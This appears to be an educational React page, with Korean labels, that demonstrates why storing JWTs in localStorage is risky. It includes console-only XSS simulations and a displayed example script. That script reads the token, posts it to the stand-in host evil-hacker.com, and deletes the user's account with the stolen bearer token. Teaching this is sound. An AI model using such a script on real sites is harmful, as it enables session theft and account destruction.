"use client";

import { useState } from "react";

export default function SecurityTest() {
  const [token, setToken] = useState<string>("");
  const [storedToken, setStoredToken] = useState<string>("");
  const [decodedToken, setDecodedToken] = useState<any>(null);
  const [attackResult, setAttackResult] = useState<string>("");

  // JWT 디코딩 함수 (Base64 디코딩)
  const decodeJWT = (token: string) => {
    try {
      const payload = token.split(".")[1];
      const decoded = JSON.parse(atob(payload));
      return decoded;
    } catch (error) {
      return null;
    }
  };

  // 1. 실제 JWT 토큰 생성 및 localStorage 저장
  const storeToken = () => {
    // 실제 JWT 형태의 토큰 생성 (Header.Payload.Signature)
    const header = btoa(JSON.stringify({ alg: "HS256", typ: "JWT" }));
    const payload = btoa(
      JSON.stringify({
        sub: "12345",
        name: "가짜 사용자",
        email: "user@kiroku.com",
        role: "admin",
        iat: Math.floor(Date.now() / 1000),
        exp: Math.floor(Date.now() / 1000) + 3600, // 1시간 후 만료
      })
    );
    const signature = `fake-signature-${Date.now()}`;

    const fakeJWT = `${header}.${payload}.${signature}`;

    // 토큰만 localStorage에 저장
    localStorage.setItem("userToken", fakeJWT);

    setToken(fakeJWT);
    alert("JWT 토큰이 localStorage에 저장되었습니다!");
  };

  // 2. localStorage에서 토큰 확인 및 디코딩
  const checkStoredToken = () => {
    const stored = localStorage.getItem("userToken");

    if (stored) {
      setStoredToken(stored);
      const decoded = decodeJWT(stored);
      setDecodedToken(decoded);

      console.log("저장된 토큰:", stored);
      console.log("디코딩된 사용자 정보:", decoded);
    } else {
      setStoredToken("토큰 없음");
      setDecodedToken(null);
    }
  };

  // 3. XSS 공격 시뮬레이션 (토큰 탈취 후 디코딩)
  const simulateXSSAttack = () => {
    try {
      const stolenToken = localStorage.getItem("userToken");

      if (stolenToken) {
        // 공격자가 토큰을 디코딩해서 사용자 정보 확인
        const decodedUserInfo = decodeJWT(stolenToken);

        const attackData = {
          stolenToken: stolenToken,
          decodedUserInfo: decodedUserInfo, // 토큰에서 추출한 사용자 정보
          currentUrl: window.location.href,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString(),
        };

        setAttackResult(JSON.stringify(attackData, null, 2));

        console.log("🚨 공격자가 탈취한 데이터:", attackData);
        console.log("🚨 토큰에서 추출한 사용자 정보:", decodedUserInfo);

        // 가상의 악성 요청 시뮬레이션
        console.log("🚨 악성 요청 실행: DELETE /api/user/account");
        console.log("🚨 Authorization: Bearer", stolenToken);
      } else {
        setAttackResult("탈취할 토큰이 없습니다.");
      }
    } catch (error) {
      setAttackResult("공격 실패: " + error);
    }
  };

  // 4. 모든 localStorage 데이터 탈취
  const stealAllLocalStorage = () => {
    const allData: Record<string, any> = {};

    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key) {
        const value = localStorage.getItem(key) || "";

        // JWT 토큰이면 디코딩도 함께
        if (key.includes("token") || key.includes("Token")) {
          try {
            const decoded = decodeJWT(value);
            allData[key] = {
              raw: value,
              decoded: decoded,
            };
          } catch {
            allData[key] = value;
          }
        } else {
          allData[key] = value;
        }
      }
    }

    console.log("🚨 모든 localStorage 데이터 탈취 및 분석:", allData);
    setAttackResult(JSON.stringify(allData, null, 2));
  };

  // 5. localStorage 초기화
  const clearStorage = () => {
    localStorage.clear();
    setToken("");
    setStoredToken("");
    setDecodedToken(null);
    setAttackResult("");
    alert("localStorage가 초기화되었습니다.");
  };

  return (
    <div className="min-h-screen bg-gray-50 p-8">
      <div className="max-w-4xl mx-auto">
        <h1 className="text-3xl font-bold text-center mb-8 text-red-600">
          🚨 JWT 보안 취약점 테스트 🚨
        </h1>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          {/* 정상적인 기능들 */}
          <div className="bg-white p-6 rounded-lg shadow-md">
            <h2 className="text-xl font-semibold mb-4 text-green-600">
              ✅ 정상적인 JWT 사용
            </h2>

            <div className="space-y-4">
              <button
                onClick={storeToken}
                className="w-full px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700"
              >
                1. 로그인 (JWT 토큰 저장)
              </button>

              <button
                onClick={checkStoredToken}
                className="w-full px-4 py-2 bg-green-600 text-white rounded hover:bg-green-700"
              >
                2. 토큰 확인 및 디코딩
              </button>

              {storedToken && (
                <div className="p-3 bg-gray-100 rounded text-sm text-black">
                  <strong>저장된 JWT 토큰:</strong>
                  <br />
                  <code className="break-all text-xs">{storedToken}</code>

                  {decodedToken && (
                    <div className="mt-3">
                      <strong>디코딩된 사용자 정보:</strong>
                      <pre className="text-xs mt-1 bg-gray-50 p-2 rounded">
                        {JSON.stringify(decodedToken, null, 2)}
                      </pre>
                    </div>
                  )}
                </div>
              )}
            </div>
          </div>

          {/* 공격 시뮬레이션 */}
          <div className="bg-white p-6 rounded-lg shadow-md border-2 border-red-500">
            <h2 className="text-xl font-semibold mb-4 text-red-600">
              🚨 XSS 공격 시뮬레이션
            </h2>

            <div className="space-y-4">
              <button
                onClick={simulateXSSAttack}
                className="w-full px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700"
              >
                3. JWT 토큰 탈취 + 디코딩
              </button>

              <button
                onClick={stealAllLocalStorage}
                className="w-full px-4 py-2 bg-red-800 text-white rounded hover:bg-red-900"
              >
                4. 모든 데이터 탈취 + 분석
              </button>

              {attackResult && (
                <div className="p-3 bg-red-50 border border-red-200 rounded text-sm">
                  <strong className="text-red-600">공격 결과:</strong>
                  <pre className="mt-2 text-xs overflow-auto max-h-40 text-black">
                    {attackResult}
                  </pre>
                </div>
              )}
            </div>
          </div>
        </div>

        {/* JWT 구조 설명 */}
        <div className="mt-8 bg-blue-50 p-6 rounded-lg">
          <h3 className="text-lg font-semibold mb-4 text-blue-800">
            🔍 JWT 토큰 구조
          </h3>
          <div className="text-sm text-blue-700">
            <p>
              <strong>JWT = Header.Payload.Signature</strong>
            </p>
            <ul className="mt-2 space-y-1">
              <li>
                • <strong>Header:</strong> 토큰 타입과 알고리즘 정보
              </li>
              <li>
                • <strong>Payload:</strong> 사용자 정보 (Base64로 인코딩됨)
              </li>
              <li>
                • <strong>Signature:</strong> 토큰 무결성 검증용
              </li>
            </ul>
            <p className="mt-3 text-red-600">
              ⚠️ <strong>중요:</strong> Payload는 암호화가 아닌 인코딩이므로
              누구나 디코딩 가능!
            </p>
          </div>
        </div>

        {/* 실제 XSS 공격 코드 예시 */}
        <div className="mt-8 bg-gray-900 text-green-400 p-6 rounded-lg">
          <h3 className="text-lg font-semibold mb-4">
            💀 실제 JWT 탈취 공격 코드
          </h3>
          <pre className="text-sm overflow-auto">
            {`<script>
// 1. JWT 토큰 탈취
const token = localStorage.getItem('userToken');

// 2. JWT 디코딩해서 사용자 정보 확인
function decodeJWT(token) {
  const payload = token.split('.')[1];
  return JSON.parse(atob(payload));
}

const userInfo = decodeJWT(token);
console.log('탈취한 사용자 정보:', userInfo);

// 3. 공격자 서버로 전송
fetch('https://evil-hacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    token: token,
    userInfo: userInfo,
    url: location.href
  })
});

// 4. 탈취한 토큰으로 악의적 요청
fetch('/api/user/delete', {
  method: 'DELETE',
  headers: { 'Authorization': 'Bearer ' + token }
});
</script>`}
          </pre>
        </div>

        {/* 초기화 버튼 */}
        <div className="mt-6 text-center">
          <button
            onClick={clearStorage}
            className="px-6 py-2 bg-gray-600 text-white rounded hover:bg-gray-700"
          >
            🗑️ localStorage 초기화
          </button>
        </div>
      </div>
    </div>
  );
}
